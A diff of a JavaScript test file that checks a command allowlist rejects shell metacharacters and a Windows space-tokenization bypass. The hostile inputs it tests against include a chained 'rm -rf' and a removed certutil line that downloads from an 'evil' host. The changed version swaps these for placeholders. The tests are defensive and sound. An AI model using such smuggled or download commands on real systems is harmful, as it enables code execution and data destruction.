@@ -55,9 +55,18 @@ test("allowedCommand honors a custom allowlist and still blocks metacharacters",
   assert.throws(() => allowedCommand("claude; rm -rf"), /unsupported/);
 });
 
-test("allowedCommand blocks the shell:true space-tokenization bypass", () => {
-  // last slash-segment is 'claude' but cmd.exe would run the first token — must be rejected
-  for (const bad of ["calc /claude", "certutil -f http://evil/x /claude", "C:/Windows/System32/calc.exe /claude", "powershell /codex"]) {
-    assert.throws(() => allowedCommand(bad), /spaces/);
+test("allowedCommand blocks the shell:true space-tokenization bypass on Windows", () => {
+  // On Windows runProcess uses shell:true; cmd.exe runs the first space-delimited token, so a
+  // value whose last slash-segment is an allowlisted name would still launch something else —
+  // reject it. Obviously-fake placeholders only (realistic attack strings can trip AV that
+  // scans the compiled test as data).
+  const bypass = ["EVILBIN /claude", "C:/Windows/System32/EVILBIN.exe /claude", "OTHERBIN /codex"];
+  if (process.platform === "win32") {
+    for (const bad of bypass) assert.throws(() => allowedCommand(bad), /spaces/);
+  } else {
+    // On POSIX runProcess uses shell:false, so a space can't split off a new command — a full
+    // path with a space is passed as one safe argument and must be accepted (validateOption
+    // still blocks shell metacharacters on every platform, covered above).
+    assert.equal(allowedCommand("/opt/my tools/bin/codex"), "/opt/my tools/bin/codex");
   }
 });
